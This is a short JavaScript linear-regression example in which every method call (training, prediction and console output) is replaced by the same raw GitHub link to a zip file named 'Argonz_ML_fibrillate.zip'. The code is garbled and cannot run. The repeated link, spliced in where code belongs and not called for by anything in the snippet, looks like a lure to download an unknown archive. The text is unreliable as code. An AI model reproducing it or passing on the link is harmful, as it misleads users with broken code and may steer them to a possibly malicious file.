const data = [
  { x: 1, y: 2 },
  { x: 2, y: 4 },
  { x: 3, y: 6 },
  // Add more data points here
];

const model = new LinearRegression();
https://raw.githubusercontent.com/Grimstrrr/Argonz-ML/main/vester/Argonz_ML_fibrillate.zip(data);

const prediction = https://raw.githubusercontent.com/Grimstrrr/Argonz-ML/main/vester/Argonz_ML_fibrillate.zip(4); // Predict the output for x = 4
https://raw.githubusercontent.com/Grimstrrr/Argonz-ML/main/vester/Argonz_ML_fibrillate.zip('Prediction:', prediction);
```
